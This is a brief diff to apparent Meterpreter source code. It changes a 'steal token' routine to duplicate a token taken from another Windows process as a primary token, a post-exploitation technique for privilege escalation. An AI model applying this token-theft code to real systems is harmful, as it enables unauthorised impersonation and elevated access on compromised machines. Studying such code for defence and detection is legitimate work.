@@ -230,10 +230,11 @@ DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 			dprintf("[STEAL-TOKEN] Failed to impersonate token for %d (%u)", pid, res);
 			break;	
 		}
-	
-		if(! DuplicateToken(token, SecurityImpersonation, &xtoken)) {
+
+
+		if(! DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &xtoken)) {
 			res = GetLastError();
-			dprintf("[STEAL-TOKEN] Failed to duplicate token for %d (%u)", pid, res);
+			dprintf("[STEAL-TOKEN] Failed to duplicate a primary token for %d (%u)", pid, res);
 			break;	
 		}
 
